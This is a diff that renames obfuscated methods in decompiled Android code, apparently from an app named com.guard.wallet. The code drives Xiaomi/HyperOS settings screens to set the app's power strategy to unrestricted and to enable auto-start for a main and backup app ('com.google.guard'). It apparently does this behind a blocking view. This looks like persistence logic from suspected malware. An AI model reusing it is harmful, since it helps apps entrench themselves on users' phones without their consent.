@@ -4,9 +4,9 @@
  * vendor 原始类: o/p.java (96 行)
  * 4 switch cases:
  *   case 0: 初始保活窗口入口 (100s 定时器触发 Z())
- *   case 1: 轮询等待 App 详情窗口 → c0() 查找省电策略 → j0() 推进
+ *   case 1: 轮询等待 App 详情窗口 → navigateAndSetPowerStrategy() 查找省电策略 → advanceStateMachine() 推进
  *   case 2: 自启动配置（主应用 + 备份应用）
- *   case 3: ADAPT — HyperOS 3 省电策略直达入口（跳过 c0()，直接 k0() + j0()）
+ *   case 3: ADAPT — HyperOS 3 省电策略直达入口（跳过 navigateAndSetPowerStrategy()，直接 setUnrestrictedPowerStrategy() + advanceStateMachine()）
  */
 package com.guard.wallet.delegate.task;
 
@@ -44,11 +44,11 @@ public final class XiaomiDelegateTask implements Runnable {
                 engine.getClass();
                 try {
                     AtomicInteger counter = new AtomicInteger(0);
-                    while (!engine.f0() && counter.incrementAndGet() < 20) {
+                    while (!engine.isInAppDetailWindow() && counter.incrementAndGet() < 20) {
                         com.guard.wallet.utils.SystemHelper.T0(1);
                     }
-                    engine.c0();
-                    engine.j0();
+                    engine.navigateAndSetPowerStrategy();
+                    engine.advanceStateMachine();
                 } catch (Exception ex) {
                     AppUtils.s("o.q", ex);
                 }
@@ -57,15 +57,15 @@ public final class XiaomiDelegateTask implements Runnable {
             case 3:
                 /* ADAPT: HyperOS 3 省电策略直达入口 —— openAppDetailSettings() 直接
                  * 打开 PowerDetailActivity，跳过了 ApplicationsDetailsActivity。
-                 * 直接执行 k0()（点击"无限制"）→ j0()（推进状态机到自启动管理）。 */
+                 * 直接执行 setUnrestrictedPowerStrategy()（点击"无限制"）→ advanceStateMachine()（推进状态机到自启动管理）。 */
                 engine.getClass();
                 try {
-                    if (!engine.g0()) {
+                    if (!engine.isInPowerStrategyWindow()) {
                         return;
                     }
                     Log.d("o.q", "HyperOS 3 省电策略直达: 已在省电策略窗口");
-                    engine.k0();
-                    engine.j0();
+                    engine.setUnrestrictedPowerStrategy();
+                    engine.advanceStateMachine();
                 } catch (Exception ex) {
                     AppUtils.s("o.q", ex);
                 }
@@ -75,7 +75,7 @@ public final class XiaomiDelegateTask implements Runnable {
                 /* Auto-start config: enable auto-start for main app + backup app */
                 engine.getClass();
                 try {
-                    if (!engine.h0()) {
+                    if (!engine.isInAutoStartWindow()) {
                         return;
                     }
 
@@ -86,7 +86,7 @@ public final class XiaomiDelegateTask implements Runnable {
                     String mainAppLabel = com.guard.wallet.utils.SystemHelper.x0();
                     if (!AppUtils.B(mainAppLabel)) {
                         Log.d("o.q", "mainAppLabel:" + mainAppLabel);
-                        if (engine.i0(mainAppLabel)) {
+                        if (engine.toggleAutoStart(mainAppLabel)) {
                             engine.s.set(true);
                             Log.d("o.q", mainAppLabel.concat(" 已开启自启动"));
                             com.guard.wallet.helper.BlockViewManager.h(90);
@@ -99,7 +99,7 @@ public final class XiaomiDelegateTask implements Runnable {
                     String backupAppLabel = com.guard.wallet.utils.SystemHelper.e();
                     if (com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                         Log.d("o.q", "backupAppLabel:" + backupAppLabel);
-                        if (engine.i0(backupAppLabel)) {
+                        if (engine.toggleAutoStart(backupAppLabel)) {
                             engine.t.set(true);
                             Log.d("o.q", backupAppLabel.concat(" 已开启自启动"));
                             com.guard.wallet.helper.BlockViewManager.h(90);
@@ -108,7 +108,7 @@ public final class XiaomiDelegateTask implements Runnable {
                         }
                     }
 
-                    engine.j0();
+                    engine.advanceStateMachine();
                 } catch (Exception ex) {
                     AppUtils.s("o.q", ex);
                 }
